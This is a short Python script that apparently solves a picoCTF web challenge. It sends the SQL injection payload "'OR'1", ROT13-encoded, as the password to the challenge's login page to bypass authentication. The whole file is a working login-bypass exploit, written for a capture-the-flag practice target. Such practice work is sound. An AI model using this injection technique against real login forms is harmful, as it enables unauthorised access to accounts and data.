#!/usr/bin/env python3

import requests
import codecs

# SQL injection with a little twist.
# We need to rot13 our payload for it to work.
targetUrl = 'https://jupiter.challenges.picoctf.org/problem/29132/login.php'
payload = "'OR'1"
rot13Payload = codecs.encode(payload, 'rot_13')
res = requests.post(targetUrl, data={'password': rot13Payload})
print(res.text)
